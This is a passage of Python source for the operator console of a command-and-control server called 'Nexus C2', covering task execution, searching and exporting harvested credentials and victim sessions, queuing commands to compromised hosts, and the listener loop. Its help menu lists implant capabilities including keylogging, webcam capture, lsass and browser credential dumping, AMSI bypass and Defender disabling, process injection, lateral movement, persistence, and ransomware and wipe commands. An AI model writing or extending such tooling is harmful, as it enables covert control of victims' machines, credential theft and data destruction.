                    print(TermUI.color(f"  • {name:20} - {desc:30} [{status}]", status_color))
            else:
                print(TermUI.color("[!] No tasks defined", "bright_yellow"))
        
        elif subcmd == 'run':
            if len(args) < 2:
                print(TermUI.color("[!] Usage: task run <name> [session_id]", "bright_red"))
                return
            
            task_name = args[1]
            session_id = args[2] if len(args) > 2 else self.current_session
            
            cursor = self.sm.db.conn.cursor()
            cursor.execute("SELECT commands FROM tasks WHERE name=?", (task_name,))
            task = cursor.fetchone()
            
            if task:
                commands = json.loads(task[0])
                print(TermUI.color(f"[*] Running task '{task_name}' ({len(commands)} commands)", "bright_yellow"))
                
                for cmd in commands:
                    if session_id:
                        # Send to specific session
                        self.sm.db.add_command(session_id, cmd)
                    else:
                        # Execute locally
                        self.execute(cmd)
                
                # Update task status
                cursor.execute('''
                    UPDATE tasks SET last_run=?, status='completed' WHERE name=?
                ''', (datetime.now(), task_name))
                self.sm.db.conn.commit()
                
                print(TermUI.color(f"[+] Task '{task_name}' completed", "bright_green"))
            else:
                print(TermUI.color(f"[!] Task '{task_name}' not found", "bright_red"))
        
        elif subcmd == 'delete':
            if len(args) < 2:
                print(TermUI.color("[!] Usage: task delete <name>", "bright_red"))
                return
            
            task_name = args[1]
            cursor = self.sm.db.conn.cursor()
            cursor.execute("DELETE FROM tasks WHERE name=?", (task_name,))
            self.sm.db.conn.commit()
            
            if cursor.rowcount > 0:
                print(TermUI.color(f"[+] Task '{task_name}' deleted", "bright_green"))
            else:
                print(TermUI.color(f"[!] Task '{task_name}' not found", "bright_red"))
    
    def handle_search_command(self, args):
        if len(args) < 2:
            print(TermUI.color("[!] Usage: search <what> <query>", "bright_red"))
            print(TermUI.color("[*] What: sessions, commands, files, creds", "bright_yellow"))
            return
        
        search_type = args[0].lower()
        query = ' '.join(args[1:])
        
        cursor = self.sm.db.conn.cursor()
        
        if search_type == 'sessions':
            cursor.execute('''
                SELECT external_id, hostname, username, os, ip 
                FROM sessions 
                WHERE hostname LIKE ? OR username LIKE ? OR os LIKE ? OR ip LIKE ?
            ''', (f"%{query}%", f"%{query}%", f"%{query}%", f"%{query}%"))
            
            results = cursor.fetchall()
            if results:
                print(TermUI.color(f"\nFound {len(results)} sessions:", "bright_green"))
                for ext_id, hostname, username, os, ip in results:
                    print(TermUI.color(f"  • {ext_id[:12]} - {hostname} ({username}) - {os} - {ip}", "bright_white"))
            else:
                print(TermUI.color("[!] No sessions found", "bright_yellow"))
        
        elif search_type == 'commands':
            cursor.execute('''
                SELECT c.command, c.issued_at, s.hostname
                FROM commands c
                JOIN sessions s ON c.session_id = s.id
                WHERE c.command LIKE ?
                ORDER BY c.issued_at DESC
                LIMIT 20
            ''', (f"%{query}%",))
            
            results = cursor.fetchall()
            if results:
                print(TermUI.color(f"\nRecent commands containing '{query}':", "bright_green"))
                for cmd, issued, hostname in results:
                    print(TermUI.color(f"  • [{issued[:19]}] {hostname}: {cmd[:80]}", "bright_white"))
            else:
                print(TermUI.color("[!] No commands found", "bright_yellow"))
        
        elif search_type == 'creds':
            cursor.execute('''
                SELECT c.source, c.username, c.password, s.hostname
                FROM credentials c
                JOIN sessions s ON c.session_id = s.id
                WHERE c.source LIKE ? OR c.username LIKE ? OR c.password LIKE ?
                ORDER BY c.harvested_at DESC
                LIMIT 20
            ''', (f"%{query}%", f"%{query}%", f"%{query}%"))
            
            results = cursor.fetchall()
            if results:
                print(TermUI.color(f"\nCredentials found:", "bright_green"))
                for source, username, password, hostname in results:
                    masked_pw = password[:4] + "****" if len(password) > 4 else "****"
                    print(TermUI.color(f"  • {hostname} - {source}: {username}:{masked_pw}", "bright_white"))
            else:
                print(TermUI.color("[!] No credentials found", "bright_yellow"))
        
        else:
            print(TermUI.color("[!] Unknown search type", "bright_red"))
    
    def handle_export_command(self, args):
        if len(args) < 2:
            print(TermUI.color("[!] Usage: export <what> <filename>", "bright_red"))
            print(TermUI.color("[*] What: sessions, commands, creds, all", "bright_yellow"))
            return
        
        export_type = args[0].lower()
        filename = args[1]
        
        cursor = self.sm.db.conn.cursor()
        
        if export_type == 'sessions':
            cursor.execute("SELECT * FROM sessions")
            columns = [desc[0] for desc in cursor.description]
            sessions = [dict(zip(columns, row)) for row in cursor.fetchall()]
            
            with open(filename, 'w') as f:
                json.dump(sessions, f, indent=2, default=str)
            
            print(TermUI.color(f"[+] Exported {len(sessions)} sessions to {filename}", "bright_green"))
        
        elif export_type == 'creds':
            cursor.execute('''
                SELECT c.*, s.hostname, s.ip
                FROM credentials c
                JOIN sessions s ON c.session_id = s.id
            ''')
            columns = [desc[0] for desc in cursor.description]
            creds = [dict(zip(columns, row)) for row in cursor.fetchall()]
            
            with open(filename, 'w') as f:
                json.dump(creds, f, indent=2, default=str)
            
            print(TermUI.color(f"[+] Exported {len(creds)} credentials to {filename}", "bright_green"))
        
        elif export_type == 'all':
            # Export entire database
            import shutil
            shutil.copy2(DB_FILE, filename)
            print(TermUI.color(f"[+] Exported database to {filename}", "bright_green"))
        
        else:
            print(TermUI.color("[!] Unknown export type", "bright_red"))
    
    def handle_import_command(self, args):
        if len(args) < 1:
            print(TermUI.color("[!] Usage: import <filename>", "bright_red"))
            return
        
        filename = args[0]
        
        if not os.path.exists(filename):
            print(TermUI.color(f"[!] File {filename} not found", "bright_red"))
            return
        
        # For now, just database import
        if filename.endswith('.db'):
            import shutil
            shutil.copy2(filename, DB_FILE + '.backup')
            shutil.copy2(filename, DB_FILE)
            print(TermUI.color(f"[+] Database imported from {filename}", "bright_green"))
            print(TermUI.color("[!] Restart required for changes to take effect", "bright_yellow"))
        else:
            print(TermUI.color("[!] Only .db files supported for import", "bright_red"))
    
    def send_to_session(self, command):
        if not self.current_session:
            print(TermUI.color("[!] No session selected", "bright_red"))
            return
        
        if self.current_session not in self.sm.sessions:
            print(TermUI.color(f"[!] Session {self.current_session} not found", "bright_red"))
            self.current_session = None
            return
        
        # Add to database queue
        cmd_id = self.sm.db.add_command(self.current_session, command)
        
        # Also add to memory queue for immediate processing
        if self.current_session in self.sm.session_queues:
            self.sm.session_queues[self.current_session].put({
                'id': cmd_id,
                'command': command
            })
        
        session = self.sm.sessions[self.current_session]
        session['commands_sent'] += 1
        
        print(TermUI.color(f"[*] Command queued for {session['hostname']}", "bright_yellow"))
    
    def show_help(self):
        help_text = f"""
{TermUI.color("╔══════════════════════════════════════════════════════════════════════════════╗", "bright_cyan")}
{TermUI.color("║                            NEXUS C2 - COMMAND REFERENCE                      ║", "bright_cyan")}
{TermUI.color("╠══════════════════════════════════════════════════════════════════════════════╣", "bright_cyan")}

{TermUI.color("SESSION MANAGEMENT:", "bold")}
{TermUI.color("  sessions, session list          ", "bright_green")}List all active sessions
{TermUI.color("  session info [id]               ", "bright_green")}Show session details
{TermUI.color("  use <id>, target <id>           ", "bright_green")}Switch to controlling a session
{TermUI.color("  back                            ", "bright_green")}Return to main menu
{TermUI.color("  session kill [id]               ", "bright_green")}Terminate a session
{TermUI.color("  session tag <id> <tag1>...      ", "bright_green")}Tag a session
{TermUI.color("  broadcast <command>             ", "bright_green")}Send command to all sessions

{TermUI.color("AUTOMATION:", "bold")}
{TermUI.color("  macro start                     ", "bright_green")}Start recording a macro
{TermUI.color("  macro stop                      ", "bright_green")}Stop recording
{TermUI.color("  macro save <name>               ", "bright_green")}Save recorded macro
{TermUI.color("  macro load <name>               ", "bright_green")}Load and run a macro
{TermUI.color("  macro list                      ", "bright_green")}List available macros
{TermUI.color("  task create <name>              ", "bright_green")}Create a task
{TermUI.color("  task list                       ", "bright_green")}List tasks
{TermUI.color("  task run <name> [session]       ", "bright_green")}Run a task
{TermUI.color("  task delete <name>              ", "bright_green")}Delete a task

{TermUI.color("DATA MANAGEMENT:", "bold")}
{TermUI.color("  search <type> <query>           ", "bright_green")}Search sessions/commands/creds
{TermUI.color("  export <type> <file>            ", "bright_green")}Export data to file
{TermUI.color("  import <file>                   ", "bright_green")}Import data from file

{TermUI.color("AGENT COMMANDS (when session selected):", "bold")}
{TermUI.color("  System:                         ", "bright_yellow")}sysinfo, ps, kill <pid>, shell <cmd>
{TermUI.color("  Files:                          ", "bright_yellow")}upload, download, rm, cat, find
{TermUI.color("  Network:                        ", "bright_yellow")}ifconfig, netstat, arp, route, scan
{TermUI.color("  Intelligence:                   ", "bright_yellow")}screenshot, webcam, keylog, clipboard
{TermUI.color("  Credentials:                    ", "bright_yellow")}wifi, browser, dump hashes, dump lsass
{TermUI.color("  Privilege:                      ", "bright_yellow")}whoami, privileges, getsystem, bypassuac
{TermUI.color("  Persistence:                    ", "bright_yellow")}persist install, persist remove
{TermUI.color("  Evasion:                        ", "bright_yellow")}amsibypass, defender disable, unhook
{TermUI.color("  Injection:                      ", "bright_yellow")}inject <pid>, migrate <pid>, hollow
{TermUI.color("  Lateral:                        ", "bright_yellow")}psexec, wmi, smb, rdp
{TermUI.color("  Impact:                         ", "bright_yellow")}ransomware, destroy, wipe, lock
{TermUI.color("  C2 Control:                     ", "bright_yellow")}beacon, jitter, sleep, selfdestruct

{TermUI.color("UTILITIES:", "bold")}
{TermUI.color("  help, ?                         ", "bright_green")}Show this help
{TermUI.color("  exit, quit                      ", "bright_green")}Exit Nexus C2

{TermUI.color("╚══════════════════════════════════════════════════════════════════════════════╝", "bright_cyan")}
        """
        print(help_text)
    
    def handle_exit(self):
        print(TermUI.color("\n[*] Shutting down Nexus C2...", "bright_yellow"))
        
        # Close all sessions
        for session_id, session in list(self.sm.sessions.items()):
            session['status'] = 'dead'
            if session_id in self.sm.session_sockets:
                try:
                    self.sm.session_sockets[session_id].close()
                except:
                    pass
        
        # Stop listener
        self.sm.listener_running = False
        if self.sm.listener_socket:
            try:
                self.sm.listener_socket.close()
            except:
                pass
        
        print(TermUI.color("[+] Nexus C2 terminated", "bright_green"))
        sys.exit(0)

# ==================== MAIN ====================
def main():
    # Create directories
    os.makedirs("files", exist_ok=True)
    os.makedirs("screenshots", exist_ok=True)
    os.makedirs("keylogs", exist_ok=True)
    os.makedirs("webcam", exist_ok=True)
    os.makedirs("audio", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    os.makedirs("modules", exist_ok=True)
    os.makedirs("macros", exist_ok=True)
    
    # Initialize
    TermUI.print_banner()
    
    # Get encryption key
    passphrase = input(TermUI.color("[?] Enter master passphrase: ", "bright_yellow")).strip()
    if not passphrase:
        passphrase = "nexus_default_change_me_in_production"
        print(TermUI.color("[!] Using default passphrase - CHANGE IN PRODUCTION!", "bright_red"))
    
    # Initialize session manager
    sm = SessionManager()
    sm.set_encryption(passphrase)
    
    # Start listener
    if not sm.start_listener():
        print(TermUI.color("[!] Failed to start listener", "bright_red"))
        return
    
    # Initialize command interpreter
    ci = CommandInterpreter(sm)
    
    # Main loop
    while True:
        try:
            # Show prompt
            if ci.current_session:
                session = sm.sessions.get(ci.current_session, {})
                prompt = TermUI.color(f"nexus [{session.get('hostname', 'unknown')}]> ", "bright_magenta")
            else:
                prompt = TermUI.color("nexus> ", "bright_magenta")
            
            # Get command
            command = input(prompt).strip()
            
            if command:
                ci.execute(command)
        
        except KeyboardInterrupt:
            print(TermUI.color("\n[*] Type 'exit' to quit", "bright_yellow"))
        except Exception as e:
            print(TermUI.color(f"[!] Error: {e}", "bright_red"))

if __name__ == "__main__":
    main()